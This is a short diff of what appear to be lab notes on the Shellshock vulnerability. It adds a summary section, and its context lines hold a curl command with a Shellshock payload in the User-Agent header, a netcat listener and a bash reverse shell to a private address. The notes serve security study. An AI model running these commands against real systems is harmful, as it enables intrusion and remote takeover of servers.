@@ -436,3 +436,10 @@ $ curl -A "(){echo hello;}; echo Content_type: text/plain; echo; /bin/cat /var/w
   - `nc -l 9090 -v`
 - Server
   - `/bin/bash -i > /dev/tcp/10.0.2.7/9090 2>&1 0<&1`
+
+## 4.15 Summary
+([top](#directory))
+
+- how shellshock attack works
+- conduct shellshock attack
+- reverse shell
